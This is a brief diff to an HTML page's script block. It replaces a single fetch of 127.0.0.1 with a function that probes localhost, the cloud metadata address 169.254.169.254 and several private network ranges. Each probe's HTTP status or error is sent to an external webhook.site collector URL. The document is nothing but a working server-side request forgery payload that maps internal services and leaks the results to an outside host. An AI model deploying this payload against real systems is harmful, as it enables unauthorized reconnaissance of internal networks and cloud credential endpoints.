@@ -3,9 +3,17 @@
 
 <script>
 
-fetch("http://127.0.0.1")
-.then(r => fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/internal?status="+r.status))
-.catch(e => fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/error"))
+function test(url,name){
+ fetch(url)
+ .then(r => fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/"+name+"-"+r.status))
+ .catch(e => fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/"+name+"-error"))
+}
+
+test("http://127.0.0.1","localhost")
+test("http://169.254.169.254","metadata")
+test("http://10.0.0.1","internal10")
+test("http://172.16.0.1","internal172")
+test("http://192.168.0.1","internal192")
 
 </script>
 
